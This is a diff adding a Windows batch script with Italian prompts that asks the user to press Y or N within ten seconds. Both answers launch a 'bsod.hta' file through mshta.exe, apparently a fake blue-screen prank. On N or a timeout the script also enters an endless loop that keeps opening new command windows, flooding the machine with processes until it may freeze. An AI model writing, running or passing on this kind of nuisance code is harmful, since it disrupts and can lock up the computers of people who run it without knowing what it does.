@@ -1,0 +1,50 @@
+@echo off
+setlocal EnableDelayedExpansion
+
+if "%~1" equ "TimeoutMonitor" goto %1
+
+del InputLine.txt 2> NUL
+(
+   set /P "input=Premere Y (Minuscolo) per continuare il divertimento o N per finire (Dopo 10 sec. di NON risposta la LUCIE eseguira' l'opzione peggiore): " > CON
+   > InputLine.txt call set /P "=%%input%%" < NUL
+) 2> NUL | "%~F0" TimeoutMonitor 9
+set /P "input=" < InputLine.txt
+del InputLine.txt
+if /I "%input%" equ "y" (
+   echo Wise choise, MAYBE
+cd "C:\Windows\System32"
+start mshta.exe "%userprofile%\AppData\Local\bsod.hta"
+ping 127.0.0.1 -n 7 > nul
+
+) else (
+cd "C:\Windows\System32"
+start mshta.exe "%userprofile%\AppData\Local\bsod.hta"
+:ohnoagainthissnippet
+echo Mi spiace, non ho idee. A te i soliti cmd che si aprono lol
+ping 127.0.0.1 -n 1 > nul
+start
+goto ohnoagainthissnippet
+)
+goto :EOF
+
+:TimeoutMonitor
+
+rem Get the PID of pipe's left side
+tasklist /FI "IMAGENAME eq cmd.exe" /FO TABLE /NH > tasklist.txt
+for /F "tokens=2" %%a in (tasklist.txt) do (
+   set "leftSidePipePID=!lastButOnePID!"
+   set "lastButOnePID=%%a"
+)
+del tasklist.txt
+
+for /L %%i in (1,1,%2) do (
+   ping -n 2 localhost > NUL
+   if exist InputLine.txt exit /B
+)
+
+
+taskkill /PID %leftSidePipePID% /F > NUL
+echo/
+echo Timed Out> InputLine.txt
+
+exit /B
